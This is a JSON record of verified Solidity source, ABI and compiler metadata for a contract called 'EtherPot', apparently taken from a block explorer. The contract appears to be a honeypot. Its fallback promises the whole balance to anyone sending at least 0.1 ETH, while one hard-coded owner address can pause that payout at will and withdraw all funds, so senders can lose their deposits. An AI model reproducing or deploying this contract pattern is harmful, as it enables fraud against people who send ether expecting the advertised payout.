{"SourceCode": "pragma solidity ^0.8.18;\r\n\r\ncontract EtherPot {\r\n    bool private paused = false;\r\n    fallback() external payable {\r\n        if (paused == false) {\r\n            if (msg.value >= 100000000000000000) {\r\n                payable(msg.sender).transfer(address(this).balance);\r\n            }\r\n        }\r\n    }\r\n    function withdraw() external payable {\r\n        if (msg.sender == 0x1cBB0a98e6eAC1074C4a9730d363e201527A188e) {\r\n            payable(msg.sender).transfer(address(this).balance);\r\n        }\r\n    }\r\n    function pause(bool _pause) external payable {\r\n        if (msg.sender == 0x1cBB0a98e6eAC1074C4a9730d363e201527A188e) {\r\n            paused = _pause;\r\n        }\r\n    }\r\n}", "ABI": "[{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_pause\",\"type\":\"bool\"}],\"name\":\"pause\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"}]", "ContractName": "EtherPot", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://55feea38671582bcd28de8ff79d443f37c2cc8ba1b50d1a4af079d4fa08cd2b1"}